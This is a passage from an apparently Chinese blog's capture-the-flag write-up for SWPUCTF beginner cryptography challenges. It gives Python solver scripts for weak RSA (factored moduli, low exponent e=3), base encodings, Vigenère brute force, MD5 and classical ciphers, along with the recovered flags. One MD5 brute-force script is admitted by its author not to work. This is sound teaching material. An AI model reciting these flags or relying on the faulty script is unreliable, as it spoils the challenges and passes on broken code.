class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c= <span class="number">10227915341268619536932290456122384969242151167487654201363877568935534996454863939953106193665663567559506242151019201314446286458150141991211233219320700112533775367958964780047682920839507351492644735811096995884754664899221842470772096509258104067131614630939533042322095150722344048082688772981180270243</span></span><br><span class="line">n= <span class="number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span></span><br><span class="line"><span class="comment"># factordb 分解素数n</span></span><br><span class="line">p = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span></span><br><span class="line">q = <span class="number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;no_why&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="SWPUCTF-2021-新生赛-crypto5-低指数e攻击"><a href="#SWPUCTF-2021-新生赛-crypto5-低指数e攻击" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto5 低指数e攻击"></a>[SWPUCTF 2021 新生赛]crypto5 低指数e攻击</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">flag= <span class="number">25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333</span></span><br><span class="line">n= <span class="number">134109481482703713214838023035418052567000870587160796935708584694132507394211363652420160931185332280406437290210512090663977634730864032370977407179731940068634536079284528020739988665713200815021342700369922518406968356455736393738946128013973643235228327971170711979683931964854563904980669850660628561419</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下载附件后 只得到了 n c</p>
<p>没有其他条件 就只能先考虑低指数e去试了 e 1~3</p>
<p>e=3 可直接得到flag 套代码即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">25166751653530941364839663846806543387720865339263370907985655775152187319464715737116599171477207047430065345882626259880756839094179627032623895330242655333</span></span><br><span class="line">n = <span class="number">134109481482703713214838023035418052567000870587160796935708584694132507394211363652420160931185332280406437290210512090663977634730864032370977407179731940068634536079284528020739988665713200815021342700369922518406968356455736393738946128013973643235228327971170711979683931964854563904980669850660628561419</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k = k+<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;because_i_like&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-新生赛-crypto6-base"><a href="#SWPUCTF-2021-新生赛-crypto6-base" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto6 base"></a>[SWPUCTF 2021 新生赛]crypto6 base</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;************************************&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;NSSCTF&#123;&#x27;</span> + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">小明不小心泄露了源码，输出结果为：4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D，你能还原出var的正确结果吗？</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>已知密文 分别进行了 b16 b32 b64加密</p>
<p>对应 b64 b32 b16解密即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag=&#x27;NSSCTF&#123;&#x27; + base64.b16encode(base64.b32encode(base64.b64encode(var.encode()))) + &#x27;&#125;&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;4A5A4C564B36434E4B5241544B5432454E4E32465552324E47424758534D44594C4657564336534D4B5241584F574C4B4B463245365643424F35485649534C584A5A56454B4D4B5049354E47593D3D3D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>+base64.b64decode(base64.b32decode(base64.b16decode(c))) +<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;5e110989-dc43-1bd3-00b4-9009206158fe&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-新生赛-crypto7-md5"><a href="#SWPUCTF-2021-新生赛-crypto7-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto7 md5"></a>[SWPUCTF 2021 新生赛]crypto7 md5</h2><p>题目：</p>
<p>69f7906323b4f7d1e4e972acf4abfbfc ,得到的结果用NSSCTF{}包裹。</p>
<p>md5直接解密即可</p>
<p><img src="/posts/bb5a57d9/2.png"></p>
<h2 id="SWPUCTF-2021-新生赛-crypto8-UUencode"><a href="#SWPUCTF-2021-新生赛-crypto8-UUencode" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto8  UUencode"></a>[SWPUCTF 2021 新生赛]crypto8  UUencode</h2><p>题目：</p>
<p>73E-30U1&amp;&gt;V-H965S95]I&lt;U]P;W=E&lt;GT`</p>
<p><a href="http://www.hiencode.com/uu.html">http://www.hiencode.com/uu.html</a> UUencode解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;cheese_is_power&#125;</span><br></pre></td></tr></table></figure>



<p>UUencode【Unix-to-Unix encoding】编码特征：</p>
<p>编码时将 <strong>3个字符</strong> 顺序放入一个24位的缓冲区，缺字符的地方补零，然后将缓冲区截断成为4个部分，高位在先，每个部分6位，用下面的64个字符重新表示</p>
<p>3个字符 24bit 6bit为一组分成4组，每组以十进制表示出现的字节数值，数值在0~63之间，然后加上32 得到ascii对应字符</p>
<p>64个字符【对应ascii码32(空格) - 95(_)】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!”#$%&amp;’()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_</span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-新生赛-crypto9"><a href="#SWPUCTF-2021-新生赛-crypto9" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto9"></a>[SWPUCTF 2021 新生赛]crypto9</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">AKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125;</span><br><span class="line">脚本给你了，去解吧</span><br><span class="line"></span><br><span class="line">letter_list = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>  <span class="comment"># 字母表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的key生成key列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_KeyList</span>(<span class="params">key</span>):</span><br><span class="line">    key_list = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">        key_list.append(<span class="built_in">ord</span>(ch.upper()) - <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key_list</span>):</span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:  <span class="comment"># 遍历明文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 明文是否为字母,如果是,则判断大小写,分别进行加密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> + key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> + key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到密文字符串里</span></span><br><span class="line">            ciphertext += ch</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:  <span class="comment"># 遍历密文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 密文为否为字母,如果是,则判断大小写,分别进行解密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> - key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> - key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到明文字符串里</span></span><br><span class="line">            plaintext += ch</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密请按D,解密请按E:&quot;</span>)</span><br><span class="line">    user_input = <span class="built_in">input</span>();</span><br><span class="line">    <span class="keyword">while</span> (user_input != <span class="string">&#x27;D&#x27;</span> <span class="keyword">and</span> user_input != <span class="string">&#x27;E&#x27;</span>):  <span class="comment"># 输入合法性判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入有误!请重新输入:&quot;</span>)</span><br><span class="line">        user_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入密钥:&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">False</span> == key.isalpha()):  <span class="comment"># 输入合法性判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入有误!密钥为字母,请重新输入:&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">    key_list = Get_KeyList(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_input == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="comment"># 加密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入明文:&quot;</span>)</span><br><span class="line">        plaintext = <span class="built_in">input</span>()</span><br><span class="line">        ciphertext = Encrypt(plaintext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密文为:\n%s&quot;</span> % ciphertext)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 解密</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入密文:&quot;</span>)</span><br><span class="line">        ciphertext = <span class="built_in">input</span>()</span><br><span class="line">        plaintext = Decrypt(ciphertext, key_list)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;明文为:\n%s&quot;</span> % plaintext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>WP key尝试遍历3位</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">letter_list = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>  <span class="comment"># 字母表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入的key生成key列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_KeyList</span>(<span class="params">key</span>):</span><br><span class="line">    key_list = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">        key_list.append(<span class="built_in">ord</span>(ch.upper()) - <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plaintext, key_list</span>):</span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:  <span class="comment"># 遍历明文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 明文是否为字母,如果是,则判断大小写,分别进行加密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> + key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ciphertext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> + key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到密文字符串里</span></span><br><span class="line">            ciphertext += ch</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ciphertext:  <span class="comment"># 遍历密文</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == i % <span class="built_in">len</span>(key_list):</span><br><span class="line">            i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():  <span class="comment"># 密文为否为字母,如果是,则判断大小写,分别进行解密</span></span><br><span class="line">            <span class="keyword">if</span> ch.isupper():</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">65</span> - key_list[i]) % <span class="number">26</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                plaintext += letter_list[(<span class="built_in">ord</span>(ch) - <span class="number">97</span> - key_list[i]) % <span class="number">26</span>].lower()</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># 如果密文不为字母,直接添加到明文字符串里</span></span><br><span class="line">            plaintext += ch</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(letter_list)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(letter_list)):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(letter_list)):</span><br><span class="line">                key_list = [i,j,k]</span><br><span class="line">                ciphertext = <span class="string">&#x27;AKKPLX&#123;qv5x0021-7n8w-wr05-x25w-7882ntu5q984&#125;&#x27;</span></span><br><span class="line">                plaintext = Decrypt(ciphertext, key_list)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;NSSCTF&quot;</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;明文为:\n%s&quot;</span> % plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;dd5f0021-7a8e-ee05-f25e-7882abc5d984&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>AKKPLX{qv5x0021-7n8w-wr05-x25w-7882ntu5q984} -》 NSSCTF{ 像凯撒变种</p>
<p>维吉尼亚加密 利用网站 <a href="https://www.dcode.fr/vigenere-cipher">https://www.dcode.fr/vigenere-cipher</a> 爆破 NSSCTF{dd5f0021-7a8e-ee05-f25e-7882abc5d984}</p>
<p><img src="/posts/bb5a57d9/3.png"></p>
<h2 id="SWPUCTF-2021-新生赛-crypto10-维吉尼亚"><a href="#SWPUCTF-2021-新生赛-crypto10-维吉尼亚" class="headerlink" title="[SWPUCTF 2021 新生赛]crypto10 [维吉尼亚]"></a>[SWPUCTF 2021 新生赛]crypto10 [维吉尼亚]</h2><p>AFFPGS{pbatenghyngvbaf!!!},建议直接秒了 维吉尼亚直接爆破  NSSCTF{congratulations!!!}</p>
<p><img src="/posts/bb5a57d9/4.png"></p>
<h2 id="SWPUCTF-2021-新生赛-pigpig-猪圈"><a href="#SWPUCTF-2021-新生赛-pigpig-猪圈" class="headerlink" title="[SWPUCTF 2021 新生赛]pigpig [猪圈]"></a>[SWPUCTF 2021 新生赛]pigpig [猪圈]</h2><p>猪圈密码 <a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></p>
<p>w h e n t h e p i g w a n t t o e a t</p>
<p><img src="/posts/bb5a57d9/5.png"></p>
<h2 id="SWPUCTF-2022-新生赛-小明文"><a href="#SWPUCTF-2022-新生赛-小明文" class="headerlink" title="[SWPUCTF 2022 新生赛]小明文"></a>[SWPUCTF 2022 新生赛]小明文</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phiN)</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="comment">#c=128198926274489803523728445192921664</span></span><br><span class="line"><span class="comment">#flag=NSSCTF&#123;c&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>c = k*n + m^e → m</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">128198926274489803523728445192921664</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">504229359204</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(c+k*n,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k = k+<span class="number">1</span></span><br><span class="line"><span class="comment">#c=128198926274489803523728445192921664</span></span><br><span class="line"><span class="comment">#flag=NSSCTF&#123;c&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;ufind&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="SWPUCTF-2022-新生赛-爆破MD5"><a href="#SWPUCTF-2022-新生赛-爆破MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]爆破MD5"></a>[SWPUCTF 2022 新生赛]爆破MD5</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data=<span class="string">&#x27;Boom_MD5****&#x27;</span></span><br><span class="line">flag=MD5(data)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#0618ac93d4631df725bceea74d0*****</span></span><br></pre></td></tr></table></figure>

<p>刚开始只跑了大小写+数字 没加符号没跑出来</p>
<p>随后加了符号 然后就是漫长的等待……</p>
<p>但是没跑出来 。 。 脚本好像有问题  额 。。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># data=&#x27;Boom_MD5****&#x27;</span></span><br><span class="line"><span class="comment"># flag=MD5(data)</span></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment">#0618ac93d4631df725bceea74d0*****</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_encrypt</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 创建 MD5 加密对象</span></span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        <span class="comment"># 将输入字符串编码为字节</span></span><br><span class="line">        input_bytes = input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># 更新 MD5 对象</span></span><br><span class="line">        md5.update(input_bytes)</span><br><span class="line">        <span class="comment"># 获取 MD5 加密结果</span></span><br><span class="line">        encrypted_string = md5.hexdigest()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> encrypted_string</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;加密失败: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">additional_chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">128</span>)])</span><br><span class="line"></span><br><span class="line">all_letters_and_digits = string.ascii_letters + string.digits + additional_chars</span><br><span class="line"><span class="comment"># string.ascii_uppercase 大写字母</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_letters_and_digits:</span><br><span class="line">                <span class="built_in">str</span> = <span class="string">&quot;Boom_MD5&quot;</span> + i + j + k + m</span><br><span class="line">                md5str = md5_encrypt(<span class="built_in">str</span>).lower()</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>,md5str)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;0618ac93d4631df725bceea74d0&quot;</span> <span class="keyword">in</span> md5str:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">                    <span class="built_in">print</span>(md5str)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2022-新生赛-yafu分解"><a href="#SWPUCTF-2022-新生赛-yafu分解" class="headerlink" title="[SWPUCTF 2022 新生赛]yafu分解"></a>[SWPUCTF 2022 新生赛]yafu分解</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> getflag</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">140</span>)</span><br><span class="line">q = getPrime(<span class="number">140</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phiN)</span><br><span class="line">m = bytes_to_long(getflag().encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="comment">#n=1851012829537540993346897265450988006921329733937556249710137670254755668838970157221</span></span><br><span class="line"><span class="comment">#c=1165608868963663237838494928147497339359377331987999335624507621030816298293537918937</span></span><br></pre></td></tr></table></figure>

<p>p q不是很大 yafu去分解素数</p>
<p>C:\Users\test\Desktop\yafu-1.34&gt;yafu-Win32.exe “factor(1851012829537540993346897265450988006921329733937556249710137670254755668838970157221)”</p>
<p>分解得到</p>
<p>P43 = 1362310363870711901033415700690289289304517</p>
<p>P43 = 1358730637766188714476624560503309609820513</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">1362310363870711901033415700690289289304517</span></span><br><span class="line">q = <span class="number">1358730637766188714476624560503309609820513</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1851012829537540993346897265450988006921329733937556249710137670254755668838970157221</span></span><br><span class="line">c = <span class="number">1165608868963663237838494928147497339359377331987999335624507621030816298293537918937</span></span><br><span class="line"></span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;AFFPGS&#123;snzv1l_ov9_gur_g0_Jr1p0zr&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后凯撒解密  NSSCTF{fami1y_bi9_the_t0_We1c0me}</p>
<p><img src="/posts/bb5a57d9/6.png"></p>
